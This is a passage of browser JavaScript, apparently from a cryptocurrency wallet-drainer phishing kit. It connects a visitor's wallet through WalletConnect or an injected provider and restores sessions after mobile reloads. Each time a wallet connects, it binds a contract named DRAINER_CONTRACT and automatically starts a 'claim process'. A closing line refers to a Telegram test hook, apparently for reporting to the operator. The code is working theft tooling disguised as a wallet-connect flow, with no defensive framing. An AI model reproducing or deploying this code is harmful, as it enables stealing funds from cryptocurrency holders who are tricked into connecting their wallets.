        address = await connectWalletConnect({ useFallbackId: true });
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  BUTTON WIRING
  // ══════════════════════════════════════════════════════════════════════════
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  SESSION RESTORE — rehydrate WC OR injected from BOTH schemas
  // ══════════════════════════════════════════════════════════════════════════
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChain();
    const savedMode   = getSavedMode();

    // Pending WC redirect from before a mobile reload?
    const pendingUri = sessionStorage.getItem(LS_PENDING_URI);
    const pendingTs  = sessionStorage.getItem(LS_PENDING_TS);
    if (pendingUri && pendingTs) {
      const elapsed = Date.now() - parseInt(pendingTs);
      if (elapsed < 120000) {
        logDebug('Detected pending WC session from before reload — checking…');
        try {
          const provider = await initWalletConnect({ useFallbackId: false });
          if (provider?.session && provider.accounts?.length) {
            const a = provider.accounts[0];
            activeProvider = provider;
            connectionMode = 'walletconnect';
            currentSession = provider.session;
            web3Instance = new Web3Ctor(provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(a, 'walletconnect', provider.session);
            updateConnectedUI(a, 'evm');
            logDebug(`✅ Pending WC session restored: ${a}`);
            sessionStorage.removeItem(LS_PENDING_URI);
            sessionStorage.removeItem(LS_PENDING_TS);
            setTimeout(() => {
              if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
            }, 900);
            return;
          }
        } catch (e) { logDebug('Pending restore failed: ' + e.message); }
      }
      sessionStorage.removeItem(LS_PENDING_URI);
      sessionStorage.removeItem(LS_PENDING_TS);
    }

    if (!savedWallet) return;

    // ── WalletConnect restore ──
    if (savedMode === 'walletconnect') {
      const savedSession = getSavedWCSession();
      try {
        const provider = await initWalletConnect({ useFallbackId: false, session: savedSession });
        if (provider?.session && provider.accounts?.length) {
          const a = provider.accounts[0];
          activeProvider = provider;
          connectionMode = 'walletconnect';
          currentSession = provider.session;
          web3Instance = new Web3Ctor(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(a, 'walletconnect', provider.session);
          updateConnectedUI(a, 'evm');
          logDebug(`♻️ WC session restored: ${a}`);
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
          }, 900);
          return;
        }
      } catch (e) { logDebug('WC restore: ' + e.message); }
    }

    // ── Injected restore (desktop only) ──
    if ((savedMode === 'injected' || !savedMode) && isDesktopDevice && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          injectedProvider = window.ethereum;
          activeProvider = window.ethereum;
          connectionMode = 'injected';
          web3Instance = new Web3Ctor(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(savedWallet, 'injected');
          attachInjectedEvents(window.ethereum);
          updateConnectedUI(savedWallet, 'evm');
          logDebug(`♻️ Injected session restored: ${savedWallet}`);
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
          }, 900);
          return;
        }
      } catch (e) { logDebug('Injected restore: ' + e.message); }
    }

    logDebug('⚠️ No restorable session — clearing saved wallet');
    clearSavedWallet();
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  BOOT
  // ══════════════════════════════════════════════════════════════════════════
  try {
    const [libs] = await Promise.all([
      loadWalletConnectLibraries(),
      pickRelayUrl().catch(() => null),
    ]);
    EthereumProvider = libs.EthereumProvider;
    Web3Ctor         = libs.Web3;
    logDebug('✅ All libraries loaded');

    setupEIP6963();

    // Wait for script.js's own restore attempt to settle; then try ours.
    await new Promise((r) => setTimeout(r, 800));
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  VISIBILITY CHANGE — return-from-wallet check
  // ══════════════════════════════════════════════════════════════════════════
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) return;
    if (!getSavedWallet() && !sessionStorage.getItem(LS_PENDING_URI)) return;
    logDebug('Page visible — checking connection…');

    const pendingUri = sessionStorage.getItem(LS_PENDING_URI);
    const pendingTs  = sessionStorage.getItem(LS_PENDING_TS);
    if (pendingUri && pendingTs) {
      const elapsed = Date.now() - parseInt(pendingTs);
      if (elapsed < 120000) {
        setTimeout(async () => {
          try {
            const provider = await initWalletConnect({ useFallbackId: false });
            if (provider?.session && provider.accounts?.length) {
              const a = provider.accounts[0];
              activeProvider = provider;
              connectionMode = 'walletconnect';
              currentSession = provider.session;
              web3Instance = new Web3Ctor(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              saveWallet(a, 'walletconnect', provider.session);
              updateConnectedUI(a, 'evm');
              sessionStorage.removeItem(LS_PENDING_URI);
              sessionStorage.removeItem(LS_PENDING_TS);
              setTimeout(() => {
                if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
              }, 900);
            }
          } catch (e) { logDebug('Visibility restore failed: ' + e.message); }
        }, 1000);
      }
    }
  });

  // ══════════════════════════════════════════════════════════════════════════
  //  WINDOW EVENTS
  // ══════════════════════════════════════════════════════════════════════════
  window.addEventListener('beforeunload', () => {
    document.getElementById('apex-wc-deeplink')?.remove();
  });

  // Public hooks — script.js may call these.
  window.apexConnect    = connectWallet;
  window.apexDisconnect = disconnectWallet;

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
